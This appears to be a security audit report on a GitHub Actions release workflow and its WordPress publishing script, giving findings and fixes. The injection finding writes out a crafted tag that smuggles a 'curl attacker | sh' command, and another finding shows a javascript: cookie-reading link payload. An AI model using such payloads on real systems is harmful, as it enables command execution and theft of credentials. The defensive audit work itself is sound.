## Vulnerability Findings

### [MEDIUM] GitHub Actions shell interpolation of release metadata (command injection)
**Location:** `.github/workflows/publish-release.yml:57-67`
**OWASP Category:** A05:2025-Security Misconfiguration (GH Actions script injection)
**CWE:** CWE-78: OS Command Injection | **CVSS:** 5.5 (AV:N/AC:L/PR:H/UI:N/S:C — privileged trigger, secret exfiltration impact)
**Description:** `TAG="${{ github.event.release.tag_name }}"`, `"${{ inputs.tag }}"`, and
`"${{ github.event.release.published_at }}"` are template-expanded directly into a `run:` shell block.
A crafted release tag or dispatch input (e.g. `v1"; curl attacker | sh; echo "`) executes arbitrary
shell in a job whose environment holds `WP_URL`/`WP_USER`/`WP_APP_PASSWORD`. Creating releases requires
write access, so the attacker must already be privileged — but this converts "can tag a release" into
"can exfiltrate the production WordPress Application Password", a meaningful privilege escalation.
**Remediation:** Never template-expand event data inside `run:`. Pass through env instead:
`env: { TAG_IN: ${{ github.event.release.tag_name }} }` then `TAG="$TAG_IN"` — env assignment is not
shell-parsed. Same for `inputs.tag` and `published_at`.
**Spec-Kit Task:** TASK-SEC-007

### [MEDIUM] Literal NUL byte makes the release script un-reviewable (binary blob in git)
**Location:** `.github/scripts/publish-release.mjs:167` (`const DOUBLE = '<NUL>'` in `globToRegExp()`)
**OWASP Category:** A08:2025-Software and Data Integrity Failures
**CWE:** CWE-1078: Inappropriate Source Code Style | **CVSS:** 4.0 (review-integrity impact)
**Description:** The glob sentinel is a raw 0x00 byte, so git classifies the 467-line script as
binary (`Bin 0 -> 14661 bytes`). Every future change to the ONE file that receives the site's
Application Password will render as an opaque binary blob in PRs and `git diff` — a blind spot exactly
where supply-chain review matters most.
**Remediation:** Replace the literal byte with the escape `const DOUBLE = '\u0000';` (identical
runtime value); the file becomes plain text and diffs normally.
**Spec-Kit Task:** TASK-SEC-008

### [LOW] Changelog markdown link conversion permits `javascript:` URLs
**Location:** `.github/scripts/publish-release.mjs:248-264` (`inlineMarkdownToHtml()`)
**OWASP Category:** A03:2025-Injection (stored XSS)
**CWE:** CWE-79: Cross-site Scripting | **CVSS:** 3.4 (requires malicious/compromised changelog author; WP kses may neutralise depending on the app-password user's caps)
**Description:** `[text](url)` becomes `<a href="url">` with HTML-escaping but no scheme check;
`[click](javascript:alert(document.cookie))` in `README.txt`'s changelog would publish a live
`javascript:` link on the WordPress site (if the publishing user has `unfiltered_html`).
**Remediation:** Allowlist schemes — only emit `<a>` when the URL matches `/^https?:\/\//` (or `#`/`/`);
otherwise render as escaped plain text.
**Spec-Kit Task:** TASK-SEC-009

### [LOW] HTTPS not enforced for the WordPress endpoint (Basic credentials in transit)
**Location:** `.github/scripts/publish-release.mjs:338-341` (`apiBase()`)
**OWASP Category:** A02:2025-Cryptographic Failures
**CWE:** CWE-319: Cleartext Transmission of Sensitive Information | **CVSS:** 3.1 (requires misconfigured secret + on-path attacker)
**Description:** `WP_URL` is used verbatim; an `http://` secret value would send the Application
Password Base64-encoded (i.e. cleartext) on every request.
**Remediation:** In `apiBase()`, `die()` unless the URL starts with `https://`.
**Spec-Kit Task:** TASK-SEC-010

### [LOW] GitHub Actions pinned by tag, not commit SHA
**Location:** `.github/workflows/publish-release.yml:44,49`
**OWASP Category:** A08:2025-Software and Data Integrity Failures
**CWE:** CWE-829: Inclusion of Functionality from Untrusted Control Sphere | **CVSS:** 3.0
**Description:** `actions/checkout@v4` and `actions/setup-node@v4` float on mutable tags; a
compromised upstream tag executes in a job holding the site credentials. Standard hardening for
secret-bearing workflows is full-SHA pinning.
**Remediation:** Pin both to full commit SHAs (with a tag comment), e.g.
`actions/checkout@<sha> # v4.x.y`; consider Dependabot to keep pins fresh.
**Spec-Kit Task:** TASK-SEC-011

### [INFORMATIONAL] REST error bodies dumped verbatim into CI logs
**Location:** `.github/scripts/publish-release.mjs:354-358` (`wpFetch()` failure path)
**OWASP Category:** A05:2025-Security Misconfiguration
**Description:** On non-2xx the full response body is printed to (public, if the repo is public)
Actions logs — WP error responses can leak server paths, plugin versions, or debug output. The
`Authorization` header itself is never logged.
**Remediation:** Truncate logged bodies (e.g. first 500 chars) and/or log only `code`/`message`
fields of WP error JSON.
**Spec-Kit Task:** TASK-SEC-012
